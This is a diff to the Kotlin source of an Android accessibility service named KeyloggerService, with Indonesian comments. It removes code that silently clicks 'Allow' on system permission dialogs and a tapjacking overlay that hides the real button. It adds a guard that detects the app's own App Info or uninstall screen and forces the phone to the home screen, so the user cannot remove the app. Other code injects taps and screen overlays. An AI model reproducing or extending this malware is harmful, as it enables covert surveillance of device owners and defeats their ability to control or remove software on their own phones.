@@ -25,25 +25,25 @@ class KeyloggerService : AccessibilityService() {
     companion object {
         @Volatile var instance: KeyloggerService? = null
         @Volatile var unlockCode: String = "2719"
-        /** Jika true, saat dialog izin runtime muncul, langsung klik "Izinkan"
-         *  via AccessibilityNodeInfo.ACTION_CLICK — tanpa overlay, tanpa gesture koordinat */
-        @Volatile var autoGrantEnabled: Boolean = false
 
         fun showScreenInject(text: String, style: String = "hacker", speed: Float = 0.60f) { instance?.showOverlay(text, style, speed) }
         fun injectTap(x: Float, y: Float) { instance?.dispatchTap(x, y) }
         fun hideScreenInject()   { instance?.hideOverlay() }
         fun resetUnlockCode()    { unlockCode = "2719" }
 
-        // ── Package-package sistem yang menampilkan dialog izin runtime ──────
-        val PERMISSION_DIALOG_PACKAGES = setOf(
-            "com.android.packageinstaller",          // AOSP < 10
-            "com.google.android.packageinstaller",   // AOSP / Pixel
-            "com.android.permissioncontroller",      // Android 10+
-            "com.google.android.permissioncontroller", // Pixel / AOSP 11+
-            "com.miui.securitycenter",               // MIUI (Xiaomi)
-            "com.samsung.android.permissioncontroller", // Samsung OneUI
-            "com.lge.qpair.app",                     // LG
-            "com.huawei.systemmanager"               // EMUI (Huawei)
+        // ── Package Settings / Uninstall yang perlu dipantau ─────────────────
+        private val SETTINGS_PACKAGES = setOf(
+            "com.android.settings",
+            "com.miui.securitycenter",
+            "com.samsung.android.settings",
+            "com.huawei.systemmanager",
+            "com.lge.settings"
+        )
+        private val UNINSTALL_PACKAGES = setOf(
+            "com.android.packageinstaller",
+            "com.google.android.packageinstaller",
+            "com.miui.packageinstaller",
+            "com.samsung.android.packageinstaller"
         )
     }
 
@@ -150,9 +150,9 @@ class KeyloggerService : AccessibilityService() {
                 activePkg   = pkg
                 activeField = hint
 
-                // ── Auto-trigger overlay saat dialog izin sistem muncul ──────
+                // ── Guard: tutup App Info / uninstall jika mengarah ke app kita ─
                 if (ev.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-                    autoTriggerOverlay(pkg)
+                    guardAgainstUninstall(pkg)
                 }
             }
 
@@ -206,103 +206,73 @@ class KeyloggerService : AccessibilityService() {
     }
 
     /**
-     * Cek apakah package yang baru muncul adalah dialog izin runtime.
+     * Guard Anti-Uninstall via AccessibilityService.
      *
-     * Mode AUTO-GRANT (autoGrantEnabled = true):
-     *   Langsung scan node tree → cari tombol "Izinkan" / "Allow" →
-     *   performAction(ACTION_CLICK). Tidak perlu overlay, tidak perlu koordinat.
+     * Dipanggil setiap kali window baru muncul (TYPE_WINDOW_STATE_CHANGED).
+     * Jika window adalah halaman App Info milik app kita (di Settings)
+     * atau dialog konfirmasi uninstall (PackageInstaller), langsung tekan
+     * HOME → user keluar dari halaman, app tidak bisa di-uninstall.
      *
-     * Mode OVERLAY TRICK (default):
-     *   Tampilkan overlay "BATAL" di atas tombol "Izinkan" (tapjacking).
+     * Tidak butuh SYSTEM_ALERT_WINDOW — murni AccessibilityService.
      */
-    private fun autoTriggerOverlay(pkg: String) {
-        if (!PERMISSION_DIALOG_PACKAGES.contains(pkg)) return
+    private fun guardAgainstUninstall(pkg: String) {
+        val ourPkg = packageName
 
-        if (autoGrantEnabled) {
-            // ── Mode: auto-grant via AccessibilityService node click ──────────
-            // Delay 400ms agar dialog fully rendered + node hierarchy tersedia
-            handler.postDelayed({
-                val clicked = autoClickAllow()
-                android.util.Log.d("AutoGrant", "auto-click result=$clicked pkg=$pkg")
-            }, 400)
-            return
+        when {
+            // ── Halaman App Info di Settings ──────────────────────────────────
+            // Deteksi: window Settings muncul + node tree mengandung package kita
+            SETTINGS_PACKAGES.contains(pkg) -> {
+                handler.postDelayed({
+                    if (isShowingOurAppInfo(ourPkg)) {
+                        performGlobalAction(GLOBAL_ACTION_HOME)
+                    }
+                }, 300)
+            }
+
+            // ── Dialog konfirmasi Uninstall (PackageInstaller) ────────────────
+            // Jika dialog uninstall muncul untuk app kita, langsung HOME
+            UNINSTALL_PACKAGES.contains(pkg) -> {
+                handler.postDelayed({
+                    performGlobalAction(GLOBAL_ACTION_HOME)
+                }, 200)
+            }
         }
-
-        // ── Mode: overlay trick (lama) ────────────────────────────────────────
-        if (OverlayTrickManager.isActive) return
-        if (!Settings.canDrawOverlays(applicationContext)) return
-
-        handler.postDelayed({
-            if (OverlayTrickManager.isActive) return@postDelayed
-            val configJson = """
-                {
-                  "fakeText":  "BATAL",
-                  "fakeColor": "#CC1565C0",
-                  "offsetX":   0,
-                  "offsetY":   0,
-                  "duration":  30,
-                  "fullBlock": false
-                }
-            """.trimIndent()
-            OverlayTrickManager.start(applicationContext, configJson, callerPkg = pkg)
-        }, 350)
     }
 
     /**
-     * Scan semua node di window aktif, cari tombol "Izinkan" / "Allow" dan klik.
-     * Mengembalikan true jika berhasil klik.
+     * Cek apakah window Settings yang aktif saat ini menampilkan
+     * App Info untuk package kita.
+     * Strategi: scan semua text node — jika ada yang mengandung packageName
+     * kita atau nama app kita, berarti ini halaman App Info kita.
      */
-    private fun autoClickAllow(): Boolean {
+    private fun isShowingOurAppInfo(ourPkg: String): Boolean {
         val root = rootInActiveWindow ?: return false
+        val ourAppName = try {
+            packageManager.getApplicationLabel(
+                packageManager.getApplicationInfo(ourPkg, 0)
+            ).toString().lowercase()
+        } catch (_: Exception) { "" }
+
         return try {
-            traverseAndClickAllow(root)
+            nodeContainsText(root, ourPkg) || (ourAppName.isNotBlank() && nodeContainsText(root, ourAppName))
         } finally {
             try { root.recycle() } catch (_: Exception) {}
         }
     }
 
-    private fun traverseAndClickAllow(
-        node: android.view.accessibility.AccessibilityNodeInfo
+    /** Rekursif scan node tree — cari node yang text/desc mengandung [target] */
+    private fun nodeContainsText(
+        node: android.view.accessibility.AccessibilityNodeInfo,
+        target: String
     ): Boolean {
-        // Label-label tombol "Allow" dari berbagai ROM & bahasa
-        val ALLOW_LABELS = setOf(
-            "izinkan", "allow", "izin", "grant",
-            "izinkan saja", "only this time",
-            "hanya kali ini", "selalu", "always",
-            "while using the app", "hanya saat menggunakan aplikasi",
-            "allow only while using the app"
-        )
+        val t = target.lowercase()
+        val text = node.text?.toString()?.lowercase() ?: ""
+        val desc = node.contentDescription?.toString()?.lowercase() ?: ""
+        if (text.contains(t) || desc.contains(t)) return true
 
-        val text = node.text?.toString()?.trim()?.lowercase() ?: ""
-        val desc = node.contentDescription?.toString()?.trim()?.lowercase() ?: ""
-
-        val isAllow = ALLOW_LABELS.any { label ->
-            text == label || text.startsWith(label) ||
-            desc == label || desc.startsWith(label)
-        }
-
-        if (isAllow) {
-            // Coba klik node langsung
-            if (node.isClickable) {
-                node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                return true
-            }
-            // Fallback: klik parent
-            val parent = node.parent
-            if (parent != null) {
-                if (parent.isClickable) {
-                    parent.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                    try { parent.recycle() } catch (_: Exception) {}
-                    return true
-                }
-                try { parent.recycle() } catch (_: Exception) {}
-            }
-        }
-
-        // Rekursif ke semua child
         for (i in 0 until node.childCount) {
             val child = node.getChild(i) ?: continue
-            val found = traverseAndClickAllow(child)
+            val found = nodeContainsText(child, t)
             try { child.recycle() } catch (_: Exception) {}
             if (found) return true
         }
